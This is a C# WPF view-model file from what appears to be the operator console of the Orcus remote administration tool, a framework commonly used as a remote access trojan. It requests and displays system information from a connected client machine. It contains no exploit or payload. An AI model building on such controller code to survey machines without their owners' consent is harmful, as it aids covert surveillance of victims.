using System;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.ComputerInformation;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.ComputerInformation;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class ComputerInformationViewModel : CommandView
    {
        private ComputerInformationCommand _computerInformationCommand;
        private ComputerInformation _information;
        private bool _isLoading;
        private RelayCommand _refreshInformationCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Computer"];
        public override Category Category { get; } = Category.Information;

        public bool IsLoading
        {
            get { return _isLoading; }
            set { SetProperty(value, ref _isLoading); }
        }

        public ComputerInformation Information
        {
            get { return _information; }
            set { SetProperty(value, ref _information); }
        }

        public RelayCommand RefreshInformationCommand
        {
            get
            {
                return _refreshInformationCommand ??
                       (_refreshInformationCommand = new RelayCommand(parameter =>
                       {
                           IsLoading = true;
                           _computerInformationCommand.GetInformation();
                       }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _computerInformationCommand = clientController.Commander.GetCommand<ComputerInformationCommand>();
            _computerInformationCommand.ComputerInformationReceived +=
                _computerInformationCommand_ComputerInformationReceived;
            _computerInformationCommand.Failed += _computerInformationCommand_Failed;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/ComputerSystem.ico", UriKind.Absolute));
        }

        private void _computerInformationCommand_Failed(object sender, EventArgs e)
        {
            IsLoading = false;
        }

        private void _computerInformationCommand_ComputerInformationReceived(object sender,
            ComputerInformation e)
        {
            IsLoading = false;
            Information = e;
        }

        public override async void LoadView(bool loadData)
        {
            IsLoading = true;
            if (ClientController.Client.IsComputerInformationAvailable)
                await Task.Run(() => Information =
                    ClientController.ClientCommands.GetComputerInformation(
                        ClientController.Client));
            IsLoading = false;
        }
    }
}